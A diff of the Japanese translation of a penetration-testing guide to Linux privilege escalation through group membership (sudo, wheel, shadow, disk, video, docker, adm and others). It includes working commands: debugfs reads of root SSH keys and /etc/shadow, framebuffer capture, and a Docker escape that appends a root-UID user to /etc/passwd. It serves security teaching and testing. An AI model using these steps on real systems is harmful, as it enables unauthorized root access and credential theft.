@@ -1,10 +1,12 @@
 # Interesting Groups - Linux Privesc
 
-## Sudo/Admin Groups
+{{#include ../../../banners/hacktricks-training.md}}
+
+## Sudo/Admin グループ
 
 ### **PE - Method 1**
 
-**場合によっては**、システムの **/etc/sudoers** ポリシー（またはそこから読み込まれるファイル）に、次のようなエントリが含まれています:<sup>[[3]](#references)</sup>
+**場合によっては**、システムの **/etc/sudoers** ポリシー（またはそこから include されたファイル）に、次のようなエントリが含まれていることがあります。<sup>[[3]](#references)</sup>
 ```bash
 # Allow members of group sudo to execute any command
 %sudo	ALL=(ALL:ALL) ALL
@@ -12,9 +14,9 @@
 # Allow members of group admin to execute any command
 %admin 	ALL=(ALL:ALL) ALL
 ```
-これは、いずれかのエントリに一致するユーザーが、`sudo` を通じて任意のターゲットユーザーとして任意のコマンドを実行できることを意味します（その他のポリシー条件に従います）。<sup>[[3]](#references)</sup>
+これは、いずれかのエントリに一致するユーザーが、`sudo` を介して任意の対象ユーザーとして任意のコマンドを実行できることを意味します（ポリシーのその他の条件に従います）。<sup>[[3]](#references)</sup>
 
-この場合、**root になるには次を実行するだけです**：
+この場合、**root になるには次を実行するだけです**:
 ```
 sudo su
 ```
@@ -24,25 +26,25 @@ sudo su
 ```bash
 find / -perm -4000 2>/dev/null
 ```
-**pkexec が SUID binary の場合**、polkit が要求された action を認可したときにのみ、別の user として program を実行できます。SUID bit だけでは root になることは保証されません。**sudo** または **admin** の membership が十分だと決めつけず、インストールされている policy と対象 session の authorization を確認してください。<sup>[[4]](#references)[[5]](#references)</sup>
+**pkexec が SUID binary の場合**、polkit が要求された action を authorize したときにのみ、別の user として program を実行できます。SUID bit だけでは root になることは保証されません。**sudo** または **admin** の membership で十分だと決めつけず、インストールされている policy と対象 session の authorization を確認してください。<sup>[[4]](#references)[[5]](#references)</sup>
 
-古い Local Authority backend を引き続き使用している distribution では、次のコマンドでその group rules を確認します。
+古い Local Authority backend を現在も使用している distribution では、次のコマンドで group rules を確認します。
 ```bash
 cat /etc/polkit-1/localauthority.conf.d/*
 ```
-関連するグループ名とデフォルト値はディストリビューションによって異なります。この場合、ローカルポリシーでそのグループ名が指定されている場合にのみ、そのグループは有用です。<sup>[[5]](#references)</sup>
+関連するグループ名とデフォルト設定はディストリビューションによって異なります。この文脈でグループが有用なのは、ローカルポリシーでそのグループが指定されている場合のみです。<sup>[[5]](#references)</sup>
 
-**rootになるには、次を実行できます**:
+**root になるには次を実行できます**:
 ```bash
 pkexec "/bin/sh" #Authentication is required according to the local policy
 ```
-**pkexec** を実行しようとして、次の **エラー** が表示された場合:
+**pkexec** を実行しようとして、次の **error** が表示された場合:
 ```bash
 polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
 ==== AUTHENTICATION FAILED ===
 Error executing command as another user: Not authorized
 ```
-登録済みの authentication agent がない SSH session では、policy が本来その action を許可していても、`pkexec` が次の error で失敗することがあります。polkit は、desktop 以外の session 用の text authentication agent として `pkttyagent` をドキュメント化しています。正確な挙動は version や distribution に依存するため、ローカルの policy と agent の設定を確認してください。影響を受ける NixOS の version で報告されている workaround では、**2つの異なる SSH session** を使用します。<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
+認証 agent が登録されていない SSH session では、policy が本来その action を許可している場合でも、`pkexec` が次の error で失敗することがあります。polkit では、desktop 以外の session 向けの text authentication agent として `pkttyagent` が文書化されています。正確な挙動は version や distribution に依存するため、local の policy と agent の設定を確認してください。影響を受ける NixOS の version で報告されている workaround では、**2つの異なる SSH session** を使用します。<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
 ```bash:session1
 echo $$ #Step1: Get current PID
 pkexec "/bin/bash" #Step 3, execute pkexec
@@ -55,36 +57,35 @@ pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
 ```
 ## Wheel Group
 
-場合によっては、sudoers policy に次のエントリが含まれていることもあります。
+sudoersポリシーに次のエントリが含まれている場合もあります：
 ```
 %wheel	ALL=(ALL:ALL) ALL
 ```
 これは、そのエントリに一致するすべてのユーザーが、`sudo` を通じて任意の対象ユーザーとして任意のコマンドを実行できることを意味します（ポリシーのその他の条件に従います）。<sup>[[3]](#references)</sup>
 
-この場合、**root になるには次を実行するだけです**:
+この場合、**root になるには次のコマンドを実行するだけです**:
 ```
 sudo su
 ```
 ## Shadow Group
 
-権限によって許可されているシステムでは、**shadow** グループのユーザーが **/etc/shadow** を**読み取り**できます。対象で実際のモードと ACL を確認してください:<sup>[[6]](#references)[[7]](#references)</sup>
+権限によって許可されているシステムでは、**shadow** グループのユーザーは **/etc/shadow** を**読み取る**ことができます。対象で実際のモードと ACL を確認してください:<sup>[[6]](#references)[[7]](#references)</sup>
 ```
 -rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
 ```
-それでは、ファイルを読み、**いくつかのハッシュを crack**してみましょう。
+それでは、ファイルを読み、いくつかの **hashes を crack** してみましょう。
 
-ハッシュを調査する際の、ロック状態に関する簡単な注意点:
-- `!` または `*` が付いたエントリは、一般的にパスワードログインでは対話的に使用できません。
-- `!hash` はパスワードがロックされていることを示します。残りの文字列は、ロックされる前のパスワードフィールドを表します。
-- `*` を含むフィールドは有効な `crypt(3)` ハッシュではなく、UNIX パスワードによるログインを防ぎます。これだけから、以前にパスワードが設定されていたかどうかを推測しないでください。
-
-これは、直接ログインがブロックされている場合でも、アカウントの分類に役立ちます。<sup>[[6]](#references)</sup>
+hashes を triage する際の、ロック状態に関する簡単な注意点:
+- `!` または `*` を含むエントリは、通常、password による non-interactive login ができません。
+- `!hash` は password が lock されていることを意味します。残りの文字列は、lock される前の password field を表します。
+- `*` を含む field は有効な `crypt(3)` hash ではなく、UNIX-password login を防ぎます。password が以前に設定されていたかどうかを、これだけから推測してはいけません。
+これは、直接 login がブロックされている場合でも、account の分類に役立ちます。<sup>[[6]](#references)</sup>
 
 ## Staff Group
 
-**staff**: root 権限を必要とせずに、ユーザーがシステム（`/usr/local`）へローカルな変更を追加できるようにします（`/usr/local/bin` の実行ファイルはすべてのユーザーの PATH 変数に含まれており、同じ名前の `/bin` や `/usr/bin` にある実行ファイルを「override」できる可能性がある点に注意してください）。監視やセキュリティにより関連する group `"adm"` と比較してください。<sup>[[2]](#references)[[7]](#references)</sup>
+**staff**: root privileges を必要とせずに、ユーザーがシステム（`/usr/local`）へローカルな変更を追加できるようにします（`/usr/local/bin` 内の executable はすべてのユーザーの PATH variable に含まれており、同名の `/bin` および `/usr/bin` 内の executable を「override」する可能性があることに注意してください）。monitoring/security との関連性がより高い group `"adm"` と比較してください。<sup>[[2]](#references)[[7]](#references)</sup>
 
-`PATH` 内で `/usr/local/bin` が `/usr/bin` より前にある Debian の設定（以下の例など）では、修飾されていないコマンドは最初に `/usr/local/bin` のコピーへ解決されます。対象の実効 `PATH` を確認してください。
+`PATH` で `/usr/local/bin` が `/usr/bin` より先に指定されている Debian configurations（以下の例など）では、修飾されていない command は最初に `/usr/local/bin` の copy に解決されます。target 上で有効な `PATH` を確認してください。
 ```bash
 $ echo $PATH
 /usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
@@ -92,9 +93,9 @@ $ echo $PATH
 # echo $PATH
 /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 ```
-特権プロセスが書き込み可能な `/usr/local/bin` を介して修飾されていないコマンドを解決する場合、そのコマンドを置き換えることでプロセスの権限で実行できます。テスト前に実際のパスとトリガーを確認してください。
+特権プロセスが書き込み可能な `/usr/local/bin` を通じて修飾なしのコマンドを解決する場合、そのコマンドを置き換えることでプロセスの権限で実行させられる可能性があります。テストする前に、実際のパスとトリガーを確認してください。
 
-Ubuntu システムでは、ログイン時に `pam_motd` が root として `run-parts --lsbsysinit` を介して実行可能なスクリプトを実行します。cron ジョブでも `run-parts` が使用される場合がありますが、これはディストリビューションと設定によって異なります。<sup>[[10]](#references)[[11]](#references)</sup>
+Ubuntu システムでは、ログイン時に `pam_motd` が root として `run-parts --lsbsysinit` 経由で実行可能なスクリプトを実行します。cron ジョブでも `run-parts` が使用される場合がありますが、これはディストリビューションと設定に依存します。<sup>[[10]](#references)[[11]](#references)</sup>
 ```bash
 $ cat /etc/crontab | grep run-parts
 17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
@@ -102,7 +103,7 @@ $ cat /etc/crontab | grep run-parts
 47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
 52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
 ```
-新しい SSH ログイン時に、`pspy` はこのパスが実際に対象上で呼び出されているかの確認に役立ち、root 権限なしでプロセスのコマンドラインを監視できます。<sup>[[10]](#references)[[12]](#references)</sup>
+新しい SSH ログイン時に、`pspy` はこのパスが実際に target 上で呼び出されているかの確認に役立ちます。root 権限なしでプロセスのコマンドラインを監視できます。<sup>[[10]](#references)[[12]](#references)</sup>
 ```bash
 $ pspy64
 2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
@@ -134,9 +135,9 @@ $ ls -la /bin/bash
 # 0x5 root it
 $ /bin/bash -p
 ```
-## disk グループ
+## Disk Group
 
-**disk** グループのメンバーシップにより、ブロックデバイスへの raw access が可能になり、しばしば**root access に近い状態**になります。Debian では、これはほぼ root と同等と説明されていますが、対象環境で実際のデバイス権限とストレージレイアウトを確認してください。<sup>[[7]](#references)</sup>
+**disk** グループのメンバーシップにより、ブロックデバイスへの raw access が可能になり、しばしば **root access に近い状態** になることがあります。Debian では、これはほぼ root と同等と説明されていますが、対象上の実際のデバイス権限とストレージレイアウトを確認してください。<sup>[[7]](#references)</sup>
 
 一般的なデバイスパスには `/dev/sd*` などがありますが、NVMe やその他のストレージレイアウトでは異なる名前が使用されます。
 ```bash
@@ -147,12 +148,12 @@ debugfs: ls
 debugfs: cat /root/.ssh/id_rsa
 debugfs: cat /etc/shadow
 ```
-`debugfs`はext2/ext3/ext4ファイルシステム上で動作します。上記の`/root`や`/etc/shadow`などのパスは開かれたファイルシステム内のファイルを示し、`dump`の2番目の引数はネイティブファイルシステム上の出力パスを示します。<sup>[[8]](#references)</sup> 例えば、次のコマンドは開かれたファイルシステムから`/tmp/asd1.txt`を抽出し、ネイティブファイルシステム上の`/tmp/asd2.txt`に出力します。
+`debugfs`はext2/ext3/ext4ファイルシステム上で動作します。上記の`/root`や`/etc/shadow`などのパスは開かれたファイルシステム内のファイルを指し、`dump`の2番目の引数はネイティブファイルシステム上の出力先パスです。<sup>[[8]](#references)</sup> 例えば、次のコマンドは開かれたファイルシステムから`/tmp/asd1.txt`を抽出し、ネイティブファイルシステム上の`/tmp/asd2.txt`に保存します:
 ```bash
 debugfs /dev/sda1
 debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
 ```
-`-w` オプションはファイルシステムを読み書き可能な状態で開き、`write` コマンドはネイティブファイルを開いたファイルシステムにコピーします。直接編集するとファイルシステムが破損する可能性があるため、マウント済みの稼働中ファイルシステムでは使用せず、可能な場合はオフラインイメージ上で作業してください。<sup>[[8]](#references)</sup>
+`-w` オプションはファイルシステムを読み書き可能な状態で開き、`write` コマンドはネイティブファイルを開いたファイルシステム内にコピーします。直接編集するとファイルシステムが破損する可能性があるため、マウントされた稼働中のファイルシステムでは使用せず、可能な場合はオフラインイメージ上で作業してください。<sup>[[8]](#references)</sup>
 ```bash
 debugfs -w /dev/sda1
 debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
@@ -165,32 +166,32 @@ USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
 moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
 ```
-**tty1** エントリは、Linux の最初の仮想コンソールを示します。特にコンテナやその他の環境では、これだけでユーザーが物理的にマシンの前にいることが証明されるわけではありません。<sup>[[21]](#references)</sup>
+**tty1** エントリは、Linux 仮想コンソールの 1 つ目を識別します。ただし、特にコンテナやその他の環境では、それだけでユーザーが物理的にマシンの前にいることを証明するものではありません。<sup>[[21]](#references)</sup>
 
-読み取り可能な framebuffer device を公開しているシステムでは、**video** group のメンバーシップによって、そのデバイスへのアクセスが許可される場合があります。Linux framebuffer interface では、`/dev/fb0` を画面 snapshot 用にコピーできる読み取り可能なメモリデバイスとして説明しています。`/sys/class/graphics/fb0/virtual_size` path は、その fbdev sysfs attribute が存在する環境でのみ利用できるため、まず対象を確認してください。<sup>[[7]](#references)[[9]](#references)</sup>
+読み取り可能な framebuffer デバイスを公開しているシステムでは、**video** グループのメンバーシップによって、そのデバイスへのアクセスが許可される場合があります。Linux framebuffer インターフェースのドキュメントでは、`/dev/fb0` は画面のスナップショット用にコピーできる読み取り可能なメモリデバイスとして説明されています。`/sys/class/graphics/fb0/virtual_size` パスは、その fbdev sysfs 属性が存在する環境でのみ利用できるため、まず対象を確認してください。<sup>[[7]](#references)[[9]](#references)</sup>
 ```bash
 cat /dev/fb0 > /tmp/screen.raw
 cat /sys/class/graphics/fb0/virtual_size
 ```
 インストールされている **GIMP** バージョンが raw-data importer を提供している場合は、その importer で **`screen.raw`** を開きます。サポート状況と操作項目は、バージョンや plug-in によって異なります。<sup>[[22]](#references)</sup>
 
-![Disk Group - Video Group: raw image を開くには GIMP を使用し、screen.raw ファイルを選択して、ファイルタイプとして Raw image data を選択します](<../../../images/image (463).png>)
+![Disk Group - Video Group: raw image を開くには GIMP を使用し、screen.raw ファイルを選択して、ファイル形式として Raw image data を選択します](<../../../images/image (463).png>)
 
-画像の Width と Height を framebuffer geometry に合わせて設定し、出力が判読できるようになるまで、利用可能な pixel formats/Image Types を試します。<sup>[[9]](#references)</sup>
+画像の Width と Height を framebuffer のジオメトリに合わせて設定し、出力が判読できるようになるまで、利用可能な pixel formats/Image Types を試します。<sup>[[9]](#references)</sup>
 
-![Disk Group - Video Group: 次に Width と Height を画面で使用されている値に変更し、異なる Image Types を確認します（画面が最も見やすく表示されるものを選択します）](<../../../images/image (317).png>)
+![Disk Group - Video Group: Width と Height を画面で使用されている値に変更し、異なる Image Types を確認します（画面が最も見やすく表示されるものを選択します）](<../../../images/image (317).png>)
 
-## root グループ
+## Root Group
 
-**root** グループのメンバーであっても root の UID が付与されるわけではありませんが、特権サービスやライブラリが使用する、`root` が所有するグループ書き込み可能なファイルは、依然として興味深い対象となる可能性があります。privilege-escalation の経路として扱う前に、ファイルの実際の権限とその使用方法を確認してください。
+**root** group のメンバーであっても root の UID が与えられるわけではありません。ただし、`root` が所有する group-writable ファイルは、特権サービスや library がそれらを使用する場合、興味深い対象になる可能性があります。privilege-escalation path として扱う前に、ファイルの実際の permissions と使用方法を確認してください。
 
-**root のメンバーが変更できるファイルを確認する**:
+**root メンバーが変更できるファイルを確認する**:
 ```bash
 find / -group root -perm -g=w 2>/dev/null
 ```
 ## Docker グループ
 
-標準的な rootful インストールでは、`docker` グループのメンバーシップにより、Docker daemon への root レベルのアクセスが付与されます。bind mount はデフォルトで read-write であるため、その daemon を制御できるユーザーは、ホストの `/` をコンテナに mount してホストのファイルを変更できます。これは実質的にホスト上の root 権限を与えることになります。<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
+標準的な rootful インストールでは、`docker` グループへの所属により、Docker daemon への root-level access が付与されます。bind mount はデフォルトで read-write であるため、その daemon を制御できるユーザーは、ホストの `/` をコンテナに mount してホスト上のファイルを変更できます。これは実質的にホスト上の root access を与えます。<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
 ```bash
 docker image #Get images from the docker service
 
@@ -202,13 +203,13 @@ echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/pa
 #Ifyou just want filesystem and network access you can startthe following container:
 docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
 ```
-最後に、これまでの提案が気に入らない場合や、何らかの理由（docker api firewall?）で機能しない場合は、ここで説明されているように、**privileged container を実行してそこから escape する**こともできます。
+最後に、前述の提案のどれも気に入らない場合や、何らかの理由（Docker API firewall など）で機能しない場合は、こちらで説明されているように、**privileged container を実行してそこから escape する**こともできます。
 
 {{#ref}}
 ../../containers-namespaces/container-security/
 {{#endref}}
 
-Docker socket への書き込み権限がある場合は、[**Docker socket を悪用して privileges を escalate する方法についてのこの記事**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**を読んでください。**
+Docker socket に対する write permissions がある場合は、[**Docker socket を悪用して privileges を escalate する方法についてのこの記事**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**を読んでください。**
 
 {{#ref}}
 https://github.com/KrustyHack/docker-privilege-escalation
@@ -218,36 +219,36 @@ https://github.com/KrustyHack/docker-privilege-escalation
 https://fosterelli.co/privilege-escalation-via-docker.html
 {{#endref}}
 
-## lxc/lxd グループ
+## lxc/lxd Group
 
 {{#ref}}
 ./
 {{#endref}}
 
-## Adm グループ
+## Adm Group
 
-通常、**`adm`** グループの**メンバー**には、_/var/log/_ 内にある **log** ファイルを**読み取る**権限があります。\
-したがって、このグループに属するユーザーを compromise した場合は、必ず**ログを確認**すべきです。<sup>[[7]](#references)</sup>
+通常、**`adm`** group の**members**には、_/var/log/_ 内にある **log** files を**read**する permissions があります。\
+したがって、この group に属する user を compromise した場合は、必ず**logs を確認**すべきです。<sup>[[7]](#references)</sup>
 
-## Backup / Operator / lp / Mail グループ
+## Backup / Operator / lp / Mail groups
 
-これらのグループには、service や distribution に固有の意味があります。Debian では、`backup` は委任された backup/restore、`lp` は printer daemon、`mail` は `/var/mail` 用として文書化されているため、メンバーシップを privilege path とみなす前に、ローカルの permissions を確認してください。<sup>[[7]](#references)</sup>
+これらの groups は、service や distribution に固有の意味を持ちます。Debian では、委任された backup/restore に `backup`、printer daemons に `lp`、`/var/mail` に `mail` を使用することが文書化されているため、membership を privilege path と見なす前に、ローカルの permissions を確認してください。<sup>[[7]](#references)</sup>
 
-これらは直接的な root vector というより、**credential-discovery** vector であることが多くあります。
-- **backup**: configs、keys、DB dumps、tokens を含む archives が露出する可能性があります。
-- **operator**: platform 固有の operational access により、機密性の高い runtime data が leak する可能性があります。
+これらは直接的な root vectors というより、**credential-discovery** vectors であることがよくあります。
+- **backup**: configs、keys、DB dumps、tokens を含む archives を expose する可能性があります。
+- **operator**: sensitive な runtime data を leak する可能性がある、platform-specific な operational access です。
 - **lp**: print queues/spools に document contents が含まれている可能性があります。
-- **mail**: mail spools に reset links、OTPs、内部 credentials が含まれている可能性があります。
+- **mail**: mail spools から reset links、OTPs、internal credentials が expose される可能性があります。
 
-これらのグループへの所属は、価値の高い data exposure finding として扱い、password/token reuse を通じて pivot してください。
+ここでの membership は high-value data exposure finding として扱い、password/token reuse を通じて pivot してください。
 
-## Auth グループ
+## Auth group
 
-OpenBSD では、S/Key が設定されている場合、`/etc/skey` は `root:auth` が所有しており、その records への access には `auth` グループが必要です。YubiKey records は `/var/db/yubikey` に保存されます。<sup>[[16]](#references)[[17]](#references)</sup> S/Key または YubiKey が有効になっている脆弱な OpenBSD 6.6 configuration では、`auth` privileges を持つ local users が root になることが可能でした。Qualys は prerequisite と exploit chain を文書化しており、リンク先の PoC がそれを実装しています。<sup>[[18]](#references)[[19]](#references)</sup>
+OpenBSD では、S/Key が configured されている場合、`/etc/skey` は `root:auth` が所有しており、その records への access には group `auth` が必要です。YubiKey records は `/var/db/yubikey` に保存されます。<sup>[[16]](#references)[[17]](#references)</sup> S/Key または YubiKey が enabled になっている脆弱な OpenBSD 6.6 configuration では、`auth` privileges を持つ local users が root になることができました。Qualys は prerequisite と exploit chain を文書化しており、リンク先の PoC がそれを実装しています。<sup>[[18]](#references)[[19]](#references)</sup>
 
 ## References
 
-- [1] [GUI session なしでの pkexec/pkttyagent authentication (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
+- [1] [GUI session なしでの pkexec/pkttyagent authentication（NixOS issue #18012）](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
 - [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
 - [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
 - [4] [pkexec — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
@@ -260,13 +261,13 @@ OpenBSD では、S/Key が設定されている場合、`/etc/skey` は `root:au
 - [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
 - [12] [pspy — unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy)
 - [13] [Docker Engine security](https://docs.docker.com/engine/security/)
-- [14] [root 以外の user として Docker を管理する](https://docs.docker.com/engine/install/linux-postinstall)
-- [15] [containers の実行 — Docker Docs](https://docs.docker.com/engine/containers/run/)
+- [14] [Docker を non-root user として管理する](https://docs.docker.com/engine/install/linux-postinstall)
+- [15] [Running containers — Docker Docs](https://docs.docker.com/engine/containers/run/)
 - [16] [skey(5) — OpenBSD manual pages](https://man.openbsd.org/skey.5)
 - [17] [login_yubikey(8) — OpenBSD manual pages](https://man.openbsd.org/login_yubikey.8)
-- [18] [OpenBSD の authentication vulnerabilities — Qualys Security Advisory](https://www.openwall.com/lists/oss-security/2019/12/04/5)
+- [18] [OpenBSD における authentication vulnerabilities — Qualys Security Advisory](https://www.openwall.com/lists/oss-security/2019/12/04/5)
 - [19] [openbsd-authroot — local exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
 - [20] [w(1) — Linux manual page](https://man7.org/linux/man-pages/man1/w.1.html)
-- [21] [Linux allocated devices (4.x+ version)](https://docs.kernel.org/6.16/admin-guide/devices.html)
+- [21] [Linux allocated devices（4.x 以降の version）](https://docs.kernel.org/6.16/admin-guide/devices.html)
 - [22] [Image Import and Export — GIMP Documentation](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
 {{#include ../../../banners/hacktricks-training.md}}
